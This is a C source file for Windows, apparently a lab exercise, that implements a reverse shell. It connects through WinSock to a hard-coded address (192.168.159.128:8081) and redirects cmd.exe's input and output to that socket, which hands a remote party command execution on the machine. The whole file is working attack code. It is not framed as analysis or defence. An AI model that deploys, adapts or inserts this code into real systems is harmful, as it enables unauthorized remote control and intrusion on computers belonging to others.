#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

int main(){
    SOCKET shell;
    struct sockaddr_in shell_addr;
    WSADATA wsa;
    char recv_server[512];
    char ip_addr[] = "192.168.159.128";
    int port = 8081;
    int connection;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2,2), &wsa); // Initialize WinSock
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int) NULL, (unsigned int) NULL);
    
    shell_addr.sin_port = htons(port);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    connection = WSAConnect(shell, (SOCKADDR*) &shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);

    if(connection == SOCKET_ERROR){
        printf("[!] Connection to the target server failed, Please try again!\n");
        exit(0);
    }else{
        recv(shell, recv_server, sizeof(recv_server), 0);
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell; // Pipe std input/output/error to the socket
        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi); // Spawn command prompt
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        memset(recv_server, 0, sizeof(recv_server));
    }
}